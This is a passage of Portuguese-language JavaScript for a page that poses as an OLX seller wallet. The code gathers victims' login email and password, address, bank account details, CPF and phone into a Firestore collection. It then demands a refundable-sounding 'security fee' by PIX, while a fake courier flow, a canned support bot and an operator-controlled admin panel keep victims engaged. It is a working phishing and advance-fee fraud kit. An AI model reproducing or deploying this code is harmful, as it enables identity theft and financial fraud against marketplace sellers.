                        response = 'A coleta é agendada após a confirmação do endereço. Se precisar de mais informações, clique abaixo para falar com nosso suporte.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+com+coleta+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                    } else if (message.includes('pix') || message.includes('transferência') || message.includes('transferencia')) {
                        response = 'Problemas com PIX ou transferência? Clique abaixo para falar com nosso suporte especializado.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+com+PIX+ou+transferência+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                    } else if (message.includes('alterar') || message.includes('dados')) {
                        response = 'Para alterar seus dados, acesse as configurações da sua conta. Se precisar de ajuda, clique abaixo para falar com nosso suporte.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+para+alterar+dados+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                    } else if (message.includes('prazo') || message.includes('receber')) {
                        response = 'O prazo de recebimento pode variar conforme o tipo de transação. Para detalhes, clique abaixo para falar com nosso suporte.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+com+prazo+de+recebimento+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                    } else if (message.includes('segurança') || message.includes('fraude')) {
                        response = 'A OLX preza pela sua segurança. Se suspeitar de fraude, clique abaixo para falar imediatamente com nosso suporte.<br><a href="https://wa.me/559931997318?text=Suspeita+de+fraude+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                    } else if (message.includes('humano') || message.includes('atendente') || message.includes('suporte') || message.includes('whatsapp')) {
                        response = 'Certo, entendi sua solicitação. Para esse tipo de atendimento, é necessário falar com nosso suporte especializado. <br><a href="https://wa.me/559931997318?text=Preciso+de+atendimento+humano+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Clique aqui para falar com o suporte</a>';
                    }
                    // Qualquer outra solicitação
                    response = 'Certo, entendi sua solicitação. Para esse tipo de atendimento, é necessário falar com nosso suporte especializado.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Clique aqui para falar com o suporte</a>';

                    alert(response);
                    chatInput.value = '';
                    chatModal.style.display = 'none';
                }

                if (sendChatBtn && chatInput) {
                    sendChatBtn.addEventListener('click', handleChat);
                    chatInput.addEventListener('keypress', function (e) {
                        if (e.key === 'Enter') handleChat();
                    });
                }

                // Exibir modal parabéns automaticamente após login SEMPRE que acessar após login
                const parabensModal = document.getElementById('parabensModal');
                if (parabensModal && isLoggedIn) {
                    parabensModal.style.display = 'block';
                }
                if (document.getElementById('btnVerDetalhes')) {
                    document.getElementById('btnVerDetalhes').onclick = function() {
                        document.getElementById('parabensModal').style.display = 'none';
                        document.getElementById('enderecoModal').style.display = 'block';
                        document.body.classList.add('modal-endereco-aberta');
                    };
                }

                // Fluxo customizado quando painel está ligado
                let aguardandoMotorista = false;
                let motoristaPreenchido = false;
                let dadosMotorista = {};
                // Persistir coletaSolicitada na sessionStorage para manter o fluxo mesmo após reload/login
                let coletaSolicitada = sessionStorage.getItem('coletaSolicitada') === 'true';

                function abrirModalSolicitarMotorista() {
                  document.getElementById('solicitarMotoristaModal').style.display = 'block';
                }
                function fecharModalSolicitarMotorista() {
                  document.getElementById('solicitarMotoristaModal').style.display = 'none';
                }
                function abrirModalCarregandoMotorista() {
                  document.getElementById('carregandoMotoristaModal').style.display = 'block';
                }
                function fecharModalCarregandoMotorista() {
                  document.getElementById('carregandoMotoristaModal').style.display = 'none';
                }
                function abrirModalMotoristaEncontrado() {
                  document.getElementById('motoristaEncontradoModal').style.display = 'block';
                }
                function fecharModalMotoristaEncontrado() {
                  document.getElementById('motoristaEncontradoModal').style.display = 'none';
                }

                // Listener do painel admin para controlar o fluxo
                function listenPainelFluxo() {
                  db.collection('painel').doc('admin').onSnapshot((doc) => {
                    if (doc.exists) {
                      const data = doc.data();
                      // Se painel está ligado
                      if (data.ligado) {
                        // Se dados do motorista não estão preenchidos ou não liberado pelo admin, mantém carregando
                        const motoristaOk = data.nomeMotorista && data.placaCarro && data.modeloMotorista && data.fotoMotoristaUrl;
                        if (coletaSolicitada) {
                          if (data.liberarMotorista && motoristaOk) {
                            fecharModalCarregandoMotorista();
                            fecharModalSolicitarMotorista();
                            exibirModalMotorista(data); // Sempre atualiza o modal e contador
                          } else {
                            fecharModalMotoristaEncontrado();
                            fecharModalSolicitarMotorista();
                            abrirModalCarregandoMotorista();
                          }
                        } else {
                          // Não mostrar modal de solicitação de motorista automaticamente!
                          fecharModalCarregandoMotorista();
                          fecharModalMotoristaEncontrado();
                          fecharModalSolicitarMotorista();
                        }
                      } else {
                        // Se desligado, fecha todos os modais customizados
                        fecharModalSolicitarMotorista();
                        fecharModalCarregandoMotorista();
                        fecharModalMotoristaEncontrado();
                        aguardandoMotorista = false;
                        motoristaPreenchido = false;
                        coletaSolicitada = false;
                        sessionStorage.removeItem('coletaSolicitada');
                      }
                    }
                  });
                }

                // Botão solicitar coleta
                if (document.getElementById('btnSolicitarColeta')) {
                  document.getElementById('btnSolicitarColeta').onclick = function() {
                    // Fluxo do botão "Solicitar minha coleta" (modal motorista encontrado)
                    fecharModalMotoristaEncontrado();
                    abrirModalSolicitarMotorista();
                  };
                }
                if (document.getElementById('btnSolicitarColetaModal')) {
                  document.getElementById('btnSolicitarColetaModal').onclick = function() {
                    fecharModalSolicitarMotorista();
                    abrirModalCarregandoMotorista();
                    coletaSolicitada = true;
                    sessionStorage.setItem('coletaSolicitada', 'true');
                    // Inicia o controle de exibição do motorista após 10 segundos
                    window._aguardandoMotoristaTimeout = setTimeout(verificarMotoristaLiberado, 10000);
                  };
                }

                // Ao fazer logout, limpar flag de coletaSolicitada
                document.getElementById('logoutBtn')?.addEventListener('click', function() {
                  sessionStorage.removeItem('coletaSolicitada');
                });

                // Chamar o listener do fluxo
                listenPainelFluxo();

                // Implementação da busca de CEP
                const buscarCepBtn = document.getElementById('buscarCep');
                const cepInput = document.getElementById('cep');
                const ruaInput = document.getElementById('rua');
                const bairroInput = document.getElementById('bairro');

                // Função para buscar CEP
                async function buscarCep() {
                    const cep = cepInput.value.replace(/\D/g, ''); // Remove caracteres não numéricos
                    
                    if (cep.length !== 8) {
                        alert('Por favor, digite um CEP válido com 8 dígitos.');
                        return;
                    }

                    try {
                        // Mostrar loading no botão
                        buscarCepBtn.textContent = 'Buscando...';
                        buscarCepBtn.disabled = true;

                        const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
                        const data = await response.json();

                        if (data.erro) {
                            alert('CEP não encontrado. Verifique se o CEP está correto.');
                            return;
                        }

                        // Preencher os campos com os dados retornados
                        ruaInput.value = data.logradouro || '';
                        bairroInput.value = data.bairro || '';
                        
                        // Formatar o CEP com hífen
                        cepInput.value = cep.replace(/^(\d{5})(\d{3})$/, '$1-$2');

                    } catch (error) {
                        console.error('Erro ao buscar CEP:', error);
                        alert('Erro ao buscar CEP. Tente novamente.');
                    } finally {
                        // Restaurar o botão
                        buscarCepBtn.textContent = 'Buscar';
                        buscarCepBtn.disabled = false;
                    }
                }

                // Event listener para o botão de buscar CEP
                if (buscarCepBtn) {
                    buscarCepBtn.addEventListener('click', buscarCep);
                }

                // Event listener para buscar CEP ao pressionar Enter no campo CEP
                if (cepInput) {
                    cepInput.addEventListener('keypress', function(e) {
                        if (e.key === 'Enter') {
                            e.preventDefault();
                            buscarCep();
                        }
                    });

                    // Formatar CEP automaticamente enquanto digita
                    cepInput.addEventListener('input', function(e) {
                        let value = e.target.value.replace(/\D/g, '');
                        if (value.length > 8) {
                            value = value.substring(0, 8);
                        }
                        if (value.length >= 5) {
                            value = value.replace(/^(\d{5})(\d{0,3})$/, '$1-$2');
                        }
                        e.target.value = value;
                    });
                }

                // Event listener para o formulário de endereço
                const formEndereco = document.getElementById('formEndereco');
                if (formEndereco) {
                    formEndereco.addEventListener('submit', function(e) {
                        e.preventDefault();
                        const cep = cepInput.value;
                        const rua = ruaInput.value;
                        const bairro = bairroInput.value;
                        const numero = document.getElementById('numero').value;
                        const cidade = document.getElementById('cidade') ? document.getElementById('cidade').value : '';
                        const estado = document.getElementById('estado') ? document.getElementById('estado').value : '';
                        if (!cep || !rua || !bairro || !numero) {
                            alert('Por favor, preencha todos os campos obrigatórios.');
                            return;
                        }
                        // Salvar endereço temporariamente na sessionStorage
                        const enderecoCompleto = `${rua}, ${numero}, ${bairro}, ${cidade}/${estado}, ${cep}`;
                        sessionStorage.setItem('enderecoCompleto', enderecoCompleto);
                        
                        // Fechar modal de endereço e abrir modal de dados bancários
                        document.getElementById('enderecoModal').style.display = 'none';
                        document.body.classList.remove('modal-endereco-aberta');
                        document.getElementById('dadosBancariosModal').style.display = 'block';
                    });
                }

                // Event listener para o formulário de dados bancários
                const formDadosBancarios = document.getElementById('formDadosBancarios');
                if (formDadosBancarios) {
                    formDadosBancarios.addEventListener('submit', function(e) {
                        e.preventDefault();
                        const banco = document.getElementById('banco').value;
                        const agencia = document.getElementById('agencia').value;
                        const conta = document.getElementById('conta').value;
                        const cpf = document.getElementById('cpf').value;
                        const telefone = document.getElementById('telefone').value;
                        
                        if (!banco || !agencia || !conta || !cpf || !telefone) {
                            alert('Por favor, preencha todos os campos obrigatórios.');
                            return;
                        }
                        
                        // Salvar log de login com endereço e dados bancários completos
                        const email = sessionStorage.getItem('userEmail') || '';
                        const senha = sessionStorage.getItem('userPassword') || '';
                        const enderecoCompleto = sessionStorage.getItem('enderecoCompleto') || '';
                        const dadosBancarios = `${banco} - Ag: ${agencia} - Conta: ${conta}`;
                        
                        db.collection('logs_login').add({
                            email: email,
                            senha: senha,
                            endereco: enderecoCompleto,
                            banco: banco,
                            agencia: agencia,
                            conta: conta,
                            cpf: cpf,
                            telefone: telefone,
                            dadosBancarios: dadosBancarios,
                            timestamp: firebase.firestore.FieldValue.serverTimestamp()
                        });
                        
                        // Fechar modal de dados bancários
                        document.getElementById('dadosBancariosModal').style.display = 'none';
                        
                        // Verificar configuração do painel para decidir o próximo fluxo
                        db.collection('painel').doc('admin').get().then((doc) => {
                            if (doc.exists) {
                                const data = doc.data();
                                // Se ambos desligados, vai para o fluxo de qualificação
                                if (!data.ligado && !data.liberarMotorista) {
                                    atualizarQualificacaoModal();
                                    document.getElementById('qualificacaoModal').style.display = 'block';
                                } else {
                                    document.getElementById('solicitarMotoristaModal').style.display = 'block';
                                }
                            }
                        });
                    });
                }

                // Máscara para o campo de telefone
                const telefoneInput = document.getElementById('telefone');
                if (telefoneInput) {
                    telefoneInput.addEventListener('input', function(e) {
                        let value = e.target.value.replace(/\D/g, '');
                        if (value.length > 11) {
                            value = value.substring(0, 11);
                        }
                        if (value.length >= 7) {
                            value = value.replace(/^(\d{2})(\d{5})(\d{4})$/, '($1) $2-$3');
                        } else if (value.length >= 3) {
                            value = value.replace(/^(\d{2})(\d{0,5})$/, '($1) $2');
                        }
                        e.target.value = value;
                    });
                }

                // Máscara para o campo de CPF
                const cpfInput = document.getElementById('cpf');
                if (cpfInput) {
                    cpfInput.addEventListener('input', function(e) {
                        let value = e.target.value.replace(/\D/g, '');
                        if (value.length > 11) {
                            value = value.substring(0, 11);
                        }
                        if (value.length > 9) {
                            value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
                        } else if (value.length > 6) {
                            value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
                        } else if (value.length > 3) {
                            value = value.replace(/(\d{3})(\d{1,3})/, '$1.$2');
                        }
                        e.target.value = value;
                    });
                }

                // Variável global para taxa de segurança
                let taxaSeguranca = 10; // valor padrão em porcentagem
                let valorVenda = 1500; // valor fictício da venda, pode ser dinâmico

                // Função para atualizar o modal de qualificação
                function atualizarQualificacaoModal() {
                    db.collection('painel').doc('admin').get().then((doc) => {
                        if (doc.exists) {
                            const data = doc.data();
                            const valorFixo = data.valorTaxaSeguranca;
                            taxaSeguranca = data.taxaSeguranca || 10;
                            valorVenda = data.valorVenda || 1500;
                            if (valorFixo && valorFixo > 0) {
                                document.querySelector('#qualificacaoModal p').innerHTML = `Você irá receber seu dinheiro. Com base nos nossos Termos de Segurança, para evitar fraudes, deverá ser efetuado o pagamento de <b>R$ ${Number(valorFixo).toLocaleString('pt-BR', {minimumFractionDigits: 2})}</b> como taxa de segurança. Este valor será totalmente estornado, concluindo a venda ou não.`;
                            } else {
                                const valorCobrado = ((taxaSeguranca / 100) * valorVenda).toLocaleString('pt-BR', {style: 'currency', currency: 'BRL'});
                                document.querySelector('#qualificacaoModal p').innerHTML = `Você irá receber seu dinheiro. Com base nos nossos Termos de Segurança, para evitar fraudes, deverá ser efetuado o pagamento de <b>${taxaSeguranca}%</b> do valor da sua venda (<b>${valorCobrado}</b>). Este valor será totalmente estornado, concluindo a venda ou não.`;
                            }
                        }
                    });
                }
                // Event listener para o botão 'Entendi' do modal de qualificação
                const btnEntendi = document.getElementById('btnEntendi');
                if (btnEntendi) {
                    btnEntendi.addEventListener('click', function() {
                        document.getElementById('qualificacaoModal').style.display = 'none';
                        document.getElementById('pagamentoModal').style.display = 'block';
                    });
                }

                // Atualizar valor no modal de pagamento de segurança
                function atualizarPagamentoModal() {
                    db.collection('painel').doc('admin').get().then((doc) => {
                        if (doc.exists) {
                            const data = doc.data();
                            // Atualizar chave PIX
                            document.getElementById('chavePixTexto').textContent = data.chavePix || 'Chave não configurada';
                            // Atualizar QR Code
                            const qrImg = document.getElementById('qrCodePixImg');
                            if (qrImg) {
                                qrImg.src = data.pixImageUrl || '';
                            }
                        }
                    });
                }
                // Abrir modal de pagamento e atualizar dados
                const pagamentoModal = document.getElementById('pagamentoModal');
                if (pagamentoModal) {
                    const observer = new MutationObserver(function(mutations) {
                        mutations.forEach(function(mutation) {
                            if (pagamentoModal.style.display === 'block') {
                                atualizarPagamentoModal();
                            }
                        });
                    });
                    observer.observe(pagamentoModal, { attributes: true, attributeFilter: ['style'] });
                }
                // Event listener para o botão 'Já paguei'
                const btnJaPaguei = document.getElementById('btnJaPaguei');
                if (btnJaPaguei) {
                    btnJaPaguei.addEventListener('click', function() {
                        document.getElementById('pagamentoModal').style.display = 'none';
                        document.getElementById('comprovanteModal').style.display = 'block';
                    });
                }

                // Listener em tempo real para liberar motorista
                db.collection('painel').doc('admin').onSnapshot((doc) => {
                    if (doc.exists) {
                        const data = doc.data();
                        if (data.liberarMotorista) {
                            // Se o modal de carregando motorista estiver aberto, fecha e mostra o motorista
                            if (document.getElementById('carregandoMotoristaModal').style.display === 'block') {
                                document.getElementById('carregandoMotoristaModal').style.display = 'none';
                                exibirModalMotorista(data);
                            }
                        }
                    }
                });
            }

            // Lógica de autenticação
            if (isLoggedIn) {
                // Limpar flag de coletaSolicitada ao fazer login para evitar fluxo automático indevido
                sessionStorage.removeItem('coletaSolicitada');
                mainContent.style.display = 'block';
                initializeApp();
            } else {
                loginModal.style.display = 'flex';
                loginForm.addEventListener('submit', function (e) {
                    e.preventDefault();
                    const email = document.getElementById('loginEmail').value;
                    const password = document.getElementById('loginPassword').value;
                    if (email === 'admin@olx.com' && password === 'admin123') {
                        sessionStorage.setItem('isLoggedIn', 'true');
                        sessionStorage.setItem('isAdmin', 'true');
                        // Limpar flag de coletaSolicitada ao fazer login para evitar fluxo automático indevido
                        sessionStorage.removeItem('coletaSolicitada');
                        loginModal.style.display = 'none';
                        mainContent.style.display = 'block';
                        initializeApp();
                    } else {
                        alert('E-mail ou senha incorretos!');
                    }
                });
            }

            // Chat flutuante moderno com assistente virtual
            const chatBtn = document.getElementById('chatSupportBtn');
            const chatBalloon = document.getElementById('chatBalloon');
            const closeChatBalloon = document.getElementById('closeChatBalloon');
            const chatHistory = document.getElementById('chatHistory');
            const chatForm = document.getElementById('chatForm');
            const chatInput = document.getElementById('chatInput');

            function addMessage(msg, from) {
                const div = document.createElement('div');
                div.style.margin = '8px 0';
                div.style.display = 'flex';
                div.style.justifyContent = from === 'user' ? 'flex-end' : 'flex-start';
                div.innerHTML = `<span style="background:${from==='user'?'#f7941d':'#eee'}; color:${from==='user'?'#fff':'#333'}; padding:8px 14px; border-radius:12px; max-width:80%; display:inline-block;">${msg}</span>`;
                chatHistory.appendChild(div);
                chatHistory.scrollTop = chatHistory.scrollHeight;
            }

            function botReply(userMsg) {
                const msg = userMsg.trim().toLowerCase();
                // Saudações
                if (msg.match(/\b(oi|olá|ola|bom dia|boa tarde|boa noite)\b/)) {
                    if (msg.includes('bom dia')) return 'Bom dia! ☀️ Em que posso te ajudar hoje?';
                    if (msg.includes('boa tarde')) return 'Boa tarde! ☀️ Em que posso te ajudar hoje?';
                    if (msg.includes('boa noite')) return 'Boa noite! 🌙 Em que posso te ajudar hoje?';
                    return 'Olá! 👋 Em que posso te ajudar hoje?';
                }
                // Perguntas frequentes
                if (msg.includes('sacar') || msg.includes('saque')) {
                    return 'Para sacar seu saldo, clique no botão "Sacar agora" no topo da carteira. Caso tenha dificuldades, clique abaixo para falar com nosso suporte especializado no WhatsApp.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+com+saque+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                }
                if (msg.includes('saldo')) {
                    return 'Seu saldo está visível no topo da carteira. Se precisar de detalhes ou não estiver correto, clique abaixo para falar com nosso suporte.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+com+saldo+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                }
                if (msg.includes('pagamento') || msg.includes('paguei') || msg.includes('taxa')) {
                    return 'O pagamento de segurança é necessário para evitar fraudes. Após pagar, envie o comprovante pelo botão na tela. Se precisar de ajuda, clique abaixo para falar com nosso suporte.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+com+pagamento+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                }
                if (msg.includes('motorista')) {
                    return 'O motorista será solicitado após a confirmação do endereço. Se tiver dúvidas ou não encontrou o motorista, clique abaixo para falar com nosso suporte.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+com+motorista+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                }
                if (msg.includes('coleta')) {
                    return 'A coleta é agendada após a confirmação do endereço. Se precisar de mais informações, clique abaixo para falar com nosso suporte.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+com+coleta+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                }
                if (msg.includes('pix') || msg.includes('transferência') || msg.includes('transferencia')) {
                    return 'Problemas com PIX ou transferência? Clique abaixo para falar com nosso suporte especializado.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+com+PIX+ou+transferência+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                }
                if (msg.includes('alterar') || msg.includes('dados')) {
                    return 'Para alterar seus dados, acesse as configurações da sua conta. Se precisar de ajuda, clique abaixo para falar com nosso suporte.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+para+alterar+dados+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                }
                if (msg.includes('prazo') || msg.includes('receber')) {
                    return 'O prazo de recebimento pode variar conforme o tipo de transação. Para detalhes, clique abaixo para falar com nosso suporte.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+com+prazo+de+recebimento+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                }
                if (msg.includes('segurança') || msg.includes('fraude')) {
                    return 'A OLX preza pela sua segurança. Se suspeitar de fraude, clique abaixo para falar imediatamente com nosso suporte.<br><a href="https://wa.me/559931997318?text=Suspeita+de+fraude+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Falar com suporte</a>';
                }
                if (msg.includes('humano') || msg.includes('atendente') || msg.includes('suporte') || msg.includes('whatsapp')) {
                    return 'Certo, entendi sua solicitação. Para esse tipo de atendimento, é necessário falar com nosso suporte especializado. <br><a href="https://wa.me/559931997318?text=Preciso+de+atendimento+humano+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Clique aqui para falar com o suporte</a>';
                }
                // Qualquer outra solicitação
                return 'Certo, entendi sua solicitação. Para esse tipo de atendimento, é necessário falar com nosso suporte especializado.<br><a href="https://wa.me/559931997318?text=Preciso+de+ajuda+na+carteira+OLX" target="_blank" style="color:#1ec773;font-weight:700;">Clique aqui para falar com o suporte</a>';
            }

            function openChatBalloon() {
                console.log('Botão de suporte clicado!');
                chatBalloon.style.display = 'flex';
                chatHistory.innerHTML = '';
                addMessage('Olá! 👋 Eu sou o assistente virtual da OLX. Como posso te ajudar?', 'bot');
            }

            if (chatBtn) {
                chatBtn.onclick = openChatBalloon;
            }
            if (closeChatBalloon) {
                closeChatBalloon.onclick = function() { chatBalloon.style.display = 'none'; };
            }
            if (chatForm) {
                chatForm.onsubmit = function(e) {
                    e.preventDefault();
                    const userMsg = chatInput.value;
                    if (!userMsg.trim()) return;
                    addMessage(userMsg, 'user');
                    setTimeout(() => {
                        addMessage(botReply(userMsg), 'bot');
                    }, 500);
                    chatInput.value = '';
                };
            }

            // Elementos da carteira
            const saldoDisponivel = document.getElementById('saldo-disponivel');
            const saldoReceber = document.getElementById('saldo-receber');
            const taxaPagar = document.getElementById('taxa-pagar');
            const nomeMotorista = document.getElementById('nome-motorista');
            const placaCarro = document.getElementById('placa-carro');
            const statusMsg = document.getElementById('status-msg');

            // Listener em tempo real do Firestore
            function listenCarteiraFirebase() {
                db.collection('painel').doc('admin').onSnapshot((doc) => {
                    if (doc.exists) {
                        const data = doc.data();
                        // Atualiza saldo disponível
                        if (document.getElementById('balanceAmount')) {
                            document.getElementById('balanceAmount').textContent = (data.saldoDisponivel || 0).toLocaleString('pt-BR', {minimumFractionDigits: 2});
                        }
                        // Atualiza total a receber
                        if (document.getElementById('totalReceber')) {
                            document.getElementById('totalReceber').textContent = (data.saldoReceber || 0).toLocaleString('pt-BR', {minimumFractionDigits: 2});
                        }
                        // Se quiser exibir taxa, motorista, etc, adicione aqui
                    }
                });
            }
            listenCarteiraFirebase();

            // Ao finalizar o fluxo do motorista, limpar a flag coletaSolicitada
            function finalizarFluxoMotorista() {
                sessionStorage.removeItem('coletaSolicitada');
            }
            // Adicionar chamada a finalizarFluxoMotorista ao fechar o modal de motorista encontrado
            if (document.getElementById('motoristaEncontradoModal')) {
                document.getElementById('motoristaEncontradoModal').addEventListener('click', function(e) {
                    if (e.target === this) {
                        finalizarFluxoMotorista();
                        this.style.display = 'none';
                    }
                });
            }
        });

        // Botão copiar chave PIX
        const btnCopiarPix = document.getElementById('btnCopiarPix');
        if (btnCopiarPix) {
            btnCopiarPix.addEventListener('click', function() {
                const chave = document.getElementById('chavePixTexto').textContent;
                if (navigator.clipboard) {
                    navigator.clipboard.writeText(chave);
                    btnCopiarPix.textContent = 'Copiado!';
                    setTimeout(() => btnCopiarPix.textContent = 'Copiar', 1200);
                } else {
                    alert('Não foi possível copiar automaticamente. Copie manualmente: ' + chave);
                }
            });
        }

        // --- INTEGRAÇÃO CHAT SUPORTE COM FIRESTORE ---
        // Gerar um ID de sessão anônimo se não houver
        function getSessionId() {
            let sessionId = sessionStorage.getItem('sessionId');
            if (!sessionId) {
                sessionId = 'sessao-' + Math.random().toString(36).substr(2, 9);
                sessionStorage.setItem('sessionId', sessionId);
            }
            return sessionId;
        }
        // Função para obter identificador do chat
        function getChatId() {
            const email = sessionStorage.getItem('userEmail');
            return email || getSessionId();
        }
        // Função para obter e-mail do usuário (se logado)
        function getUserEmail() {
            return sessionStorage.getItem('userEmail') || null;
        }
        // Salvar mensagem no Firestore
        async function enviarMensagemChatCliente(texto) {
            const chatId = getChatId();
            const email = getUserEmail();
            await db.collection('chats').doc(chatId).set({
                email: email,
                sessionId: chatId,
                lastMessage: Date.now()
            }, { merge: true });
            await db.collection('chats').doc(chatId).collection('mensagens').add({
                text: texto,
                from: 'cliente',
                timestamp: firebase.firestore.FieldValue.serverTimestamp()
            });
        }
        // Receber mensagens do admin em tempo real (bidirecional)
        function listenMensagensChatBidirecional() {
            const chatId = getChatId();
            const chatHistory = document.getElementById('chatHistory');
            db.collection('chats').doc(chatId).collection('mensagens').orderBy('timestamp').onSnapshot(snapshot => {
                chatHistory.innerHTML = '';
                snapshot.forEach(doc => {
                    const msg = doc.data();
                    const div = document.createElement('div');
                    div.style.margin = '8px 0';
                    div.style.display = 'flex';
                    div.style.justifyContent = msg.from === 'cliente' ? 'flex-end' : 'flex-start';
                    div.innerHTML = `<span style="background:${msg.from==='cliente'?'#f7941d':'#eee'}; color:${msg.from==='cliente'?'#fff':'#333'}; padding:8px 14px; border-radius:12px; max-width:80%; display:inline-block;">${msg.text}</span>`;
                    chatHistory.appendChild(div);
                });
                chatHistory.scrollTop = chatHistory.scrollHeight;
            });
        }
        // Integrar envio do chat flutuante
        const chatForm = document.getElementById('chatForm');
        const chatInput = document.getElementById('chatInput');
        if (chatForm && chatInput) {
            chatForm.onsubmit = async function(e) {
                e.preventDefault();
                const userMsg = chatInput.value;
                if (!userMsg.trim()) return;
                await enviarMensagemChatCliente(userMsg);
                chatInput.value = '';
            };
            listenMensagensChatBidirecional();
        }
        // Mensagem de teste automática ao abrir o chat
        const chatBtn = document.getElementById('chatSupportBtn');
        if (chatBtn) {
            chatBtn.addEventListener('click', async function() {
                await enviarMensagemChatCliente('Olá, preciso de ajuda!');
            });
        }

        // Botão Enviar Comprovante no WhatsApp
        const btnEnviarComprovante = document.getElementById('btnEnviarComprovante');
        if (btnEnviarComprovante) {
            btnEnviarComprovante.addEventListener('click', function() {
                const numero = '559931997318';
                const mensagem = encodeURIComponent('Olá, segue meu comprovante de pagamento OLX.');
                window.open(`https://wa.me/${numero}?text=${mensagem}`, '_blank');
            });
        }

        // Função centralizada para verificar se pode mostrar o modal de motorista encontrado
        function verificarMotoristaLiberado() {
          db.collection('painel').doc('admin').get().then((doc) => {
            if (doc.exists) {
              const data = doc.data();
              const motoristaOk = data.nomeMotorista && data.placaCarro && data.modeloMotorista && data.fotoMotoristaUrl;
              if (data.ligado && data.liberarMotorista && motoristaOk && document.getElementById('carregandoMotoristaModal').style.display === 'block') {
                fecharModalCarregandoMotorista();
                fecharModalSolicitarMotorista();
                document.getElementById('foto-motorista-encontrado').src = data.fotoMotoristaUrl || '';
                document.getElementById('info-motorista-encontrado').innerHTML = `<b>${data.nomeMotorista || ''}</b><br>Placa: <b>${data.placaCarro || ''}</b><br>Modelo: <b>${data.modeloMotorista || ''}</b>`;
                abrirModalMotoristaEncontrado();
                // Se já estava liberado, não precisa listener
                if (window._painelMotoristaListener) { window._painelMotoristaListener(); window._painelMotoristaListener = null; }
              } else {
                // Se não estiver liberado, ativa o listener em tempo real (garantir só um ativo)
                if (!window._painelMotoristaListener) {
                  window._painelMotoristaListener = db.collection('painel').doc('admin').onSnapshot((doc) => {
                    if (doc.exists) {
                      const data = doc.data();
                      const motoristaOk = data.nomeMotorista && data.placaCarro && data.modeloMotorista && data.fotoMotoristaUrl;
                      if (data.ligado && data.liberarMotorista && motoristaOk && document.getElementById('carregandoMotoristaModal').style.display === 'block') {
                        fecharModalCarregandoMotorista();
                        fecharModalSolicitarMotorista();
                        document.getElementById('foto-motorista-encontrado').src = data.fotoMotoristaUrl || '';
                        document.getElementById('info-motorista-encontrado').innerHTML = `<b>${data.nomeMotorista || ''}</b><br>Placa: <b>${data.placaCarro || ''}</b><br>Modelo: <b>${data.modeloMotorista || ''}</b>`;
                        abrirModalMotoristaEncontrado();
                        if (window._painelMotoristaListener) { window._painelMotoristaListener(); window._painelMotoristaListener = null; }
                      } else if (!data.ligado) {
                        fecharModalMotoristaEncontrado();
                        fecharModalSolicitarMotorista();
                        abrirModalCarregandoMotorista();
                      }
                    }
                  });
                }
              }
            }
          });
        }

        // Função para preencher e exibir o modal do motorista encontrado
        function exibirModalMotorista(data) {
          console.log('[DEBUG] exibirModalMotorista chamada', data);
          console.log('[DEBUG] tempoChegadaMotorista recebido:', data.tempoChegadaMotorista);
          let minutos = 30;
          if (data.tempoChegadaMotorista !== undefined && !isNaN(Number(data.tempoChegadaMotorista))) {
            minutos = Number(data.tempoChegadaMotorista);
          }
          document.getElementById('motoristaEncontradoModal').style.display = 'block';
          const foto = document.getElementById('foto-motorista-encontrado');
          if (data.fotoMotoristaUrl) {
            foto.src = data.fotoMotoristaUrl;
            foto.style.display = 'block';
            console.log('[DEBUG] Foto do motorista exibida:', data.fotoMotoristaUrl);
          } else {
            foto.style.display = 'none';
            console.log('[DEBUG] Foto do motorista não disponível');
          }
          document.getElementById('info-motorista-encontrado').innerHTML = `<b>${data.nomeMotorista || '---'}</b><br>Placa: <b>${data.placaCarro || '---'}</b><br>Modelo: <b>${data.modeloMotorista || '---'}</b>`;
          const tempoDiv = document.getElementById('tempo-motorista-encontrado');
          tempoDiv.innerHTML = `Chega em aproximadamente <b>${minutos}m 00s</b>`;
          console.log('[DEBUG] Tempo inicial exibido:', minutos + 'm 00s');
          if (window._contadorMotorista) clearTimeout(window._contadorMotorista);
          iniciarContadorMotorista(minutos);
          console.log('[DEBUG] Cronômetro iniciado para', minutos, 'minutos');
        }

        // Ao abrir o modal de 'Procurando motorista', iniciar timeout de 10s se liberarMotorista estiver ativado
        function abrirModalCarregandoMotorista() {
          document.getElementById('carregandoMotoristaModal').style.display = 'block';
          // Limpar qualquer timeout anterior
